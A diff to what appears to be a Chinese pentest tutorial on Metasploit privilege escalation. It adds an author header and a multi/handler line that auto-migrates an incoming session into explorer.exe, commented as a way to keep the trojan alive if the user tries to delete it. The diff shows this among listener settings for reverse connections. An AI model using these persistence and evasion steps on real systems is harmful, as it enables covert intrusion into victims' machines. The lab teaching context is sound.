@@ -7,6 +7,12 @@ title = "Metasploit简单提权"
 topics = ["Pentest"]
 
 +++
+<!--
+ * @Author: reber
+ * @Mail: reber0ask@qq.com
+ * @Date: 2019-04-10 10:45:01
+ * @LastEditTime: 2019-07-15 22:13:29
+ -->
 
 ### 0x00 前提
 虚拟机有一个shell：```http://10.11.11.20/a.php```，物理机IP是211.222.222.72   
@@ -92,6 +98,9 @@ msf exploit(multi/handler) > set LHOST 0.0.0.0
 LHOST => 0.0.0.0
 msf exploit(multi/handler) > set LPORT 8888
 LPORT => 8888
+# autorunscript: 目标上线后执行命令将进程迁移到了资源管理器，防止用户删除木马，然后丢失目标的情况
+msf exploit(multi/handler) > set autorunscript migrate -n explorer.exe
+autorunscript => migrate -n explorer.exe
 msf exploit(multi/handler) > set ExitOnSession false
 ExitOnSession => false
 msf exploit(multi/handler) > options
